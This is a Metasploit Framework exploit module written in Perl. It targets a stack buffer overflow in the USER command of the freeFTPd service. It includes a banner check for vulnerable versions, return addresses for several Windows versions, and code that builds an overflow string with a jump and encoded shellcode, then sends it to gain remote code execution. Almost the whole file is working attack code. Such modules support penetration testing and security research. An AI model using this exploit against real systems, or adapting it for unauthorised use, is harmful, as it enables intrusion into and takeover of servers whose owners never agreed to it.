##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::freeftpd_user;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'  => 'freeFTPd USER Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors' => [ 'y0 [at] w00t-shell.net', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 0,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },
	'AutoOpts' => { 'EXITFUNC' => 'process' },
	'Payload' =>
	  {
		'Space'     => 800,
		'BadChars'  => "\x00\x20\x0a\x0d",
		'Prepend'   => "\x81\xc4\xff\xef\xff\xff\x44",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
	This module exploits a stack overflow in the freeFTPd
	multi-protocol file transfer service. This flaw can only
	be exploited when logging has been enabled (non-default).

}),

	'Refs'  =>  [
		['URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2005-November/038808.html'],
	  ],
	'Targets' => [
		['Windows 2000 English ALL',       0x75022ac4],
		['Windows XP Pro SP0/SP1 English', 0x71aa32ad],
		['Windows NT SP5/SP6a English',    0x776a1799],
		['Windows 2003 Server English',    0x7ffc0638],
	  ],
	'Keys' => ['ftp'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("QUIT\r\n");
	my $res = $s->Recv(-1, 20);
	$s->Close();

	if ($res !~ /freeFTPd 1\.0/) {
		$self->PrintLine("[*] This server does not appear to be vulnerable.");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("[*] Vulnerable installation detected :-)");
	return $self->CheckCode('Detected');
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $splat = Pex::Text::EnglishText(1008);

	my $sploit =
	  $splat. "\xeb\x06". pack('V', $target->[1]).
	  $shellcode. "\r\n";

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send("USER ". $sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;

